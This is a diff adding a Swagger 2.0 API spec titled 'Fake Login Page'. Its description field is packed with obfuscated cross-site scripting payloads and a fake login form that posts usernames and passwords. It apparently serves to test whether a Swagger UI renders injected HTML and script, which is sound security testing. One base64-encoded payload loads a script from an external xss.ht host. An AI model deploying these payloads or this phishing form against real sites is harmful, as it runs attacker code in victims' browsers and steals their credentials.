@@ -1,0 +1,43 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page
+  description: '<div class="login-form">
+    <a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+    <h1 onmouseover=top[/al/.source+/ert/.source]("_Y000!_")>Y00</h1>
+    <svg onload=alert`%F0%9F%99%8C%F0%9F%8F%BB_Y000%E2%80%BC%EF%B8%8F_%F0%9F%A4%93`&gt;
+    <svg><animatetransform onbegin=alert(1) attributeName=transform>
+    <svg/onload=throw/**/onerror=alert,1>
+    <A href="javascrip%09t&colon;eval.apply`${[jj.className+`(23)`]}`" id=jj class=alert>Click Here
+    "><img/src/style=html:url("data:,"><svg/onload=confirm(69)>")>
+    <svg><animate onbegin=evt.path.pop().alert(1) attributeName=x dur=1s>
+    <img/src/onerror=arguments[0].path.pop().['al'+'ert'](1)>
+    <img/src/onerror=arguments[0].path.pop().alert(1)>
+    <video><source onerror=eval(atob(http://this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
+    <A%09onmOuSeoVER%0a=%0aa=alert,a(document.domain)>xss
+    <x v-html=_c.constructor('alert(1)')()>
+    <div class="heading">
+        <h1>HTML Injection : Fake Login</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://example.com/login" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Login</button>
+            </div>
+        </form>
+    </div>
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
